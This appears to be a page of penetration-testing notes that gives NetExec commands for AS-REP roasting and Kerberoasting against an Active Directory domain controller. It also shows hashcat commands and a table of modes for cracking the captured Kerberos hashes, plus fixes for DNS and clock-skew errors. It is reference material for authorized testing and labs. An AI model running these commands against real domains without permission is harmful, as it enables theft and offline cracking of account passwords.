---
title: Kerberos and roasting
order: 2
tags: [ad, kerberos, asrep, kerberoast, hashcat]
---

## AS-REP roasting

Requires known usernames with Kerberos preauthentication disabled. users.txt contains one reviewed candidate per line; the empty password requests unauthenticated checks.

```bash
nxc ldap {{DC}} -d '{{DOMAIN}}' -u users.txt -p '' --asreproast asrep.txt
hashcat -m 18200 asrep.txt /home/kali/tools/wordlists/rockyou.txt
```

Prepare users.txt locally. Mode 18200 applies to etype 23 output only. [Source](https://www.netexec.wiki/ldap-protocol/asreproast).

## Kerberoasting

Requires domain authentication and an eligible account with an SPN.

```bash
nxc ldap {{DC}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' --kerberoasting tgs.txt
hashcat -m 13100 tgs.txt /home/kali/tools/wordlists/rockyou.txt
```

The cracking command is for etype 23 only. Ordinary roasting requests tickets; targeted roasting that adds an SPN also needs write rights and changes AD. [Source](https://www.netexec.wiki/ldap-protocol/kerberoasting).

## Kerberos hash modes

Choose from the actual output marker, not the attack name. [Hashcat reference](https://github.com/hashcat/hashcat/blob/v8.0.0/docs/hashcat-example-hashes.md).

| Marker | Mode |
| --- | --- |
| $krb5asrep$23$ | 18200 |
| $krb5tgs$23$ | 13100 |
| $krb5tgs$17$ | 19600 |
| $krb5tgs$18$ | 19700 |
| $krb5asrep$17$ | 32100 |
| $krb5asrep$18$ | 32200 |

For AES AS-REP output, match the complete marker and the installed Hashcat mode.

```bash
hashcat -m '{{HASH_MODE}}' asrep.txt /home/kali/tools/wordlists/rockyou.txt
```

Use 32100 for etype 17 or 32200 for etype 18. Keep the entire line, including
username, realm and separators. [Upstream format examples](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-example-hashes.md).

## Kerberos DNS or clock failure

- [ ] Use the target's resolvable hostname for Kerberos, not just its IP.
- [ ] Check [DC DNS records](active-directory/ad-enumeration#identify-domain-and-dc); set NetExec's DNS server explicitly when needed.
- [ ] For KRB_AP_ERR_SKEW, compare client and KDC time and check the effective skew policy.

On Kali, query the confirmed DC before changing any local time:

```bash
date -u
ntpdig '{{DC}}'
```

In a disposable lab VM, when a clock correction is appropriate:

```bash
sudo ntpdig -S '{{DC}}'
```

`-S` steps the local system clock; it is not a read-only query. Record the original
time-sync configuration, account for any running time service that can override
the step, and restore normal synchronization after the lab. An unreachable NTP
service needs a different verified clock source, not repeated ticket requests.
[NTPsec ntpdig manual](https://docs.ntpsec.org/latest/ntpdig.html).

[Kerberos naming](https://www.netexec.wiki/getting-started/using-kerberos), [DNS options](https://www.netexec.wiki/getting-started/dns-options), [clock prerequisites](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/c427eaf8-72ae-4e4d-aeea-109263de7eee).
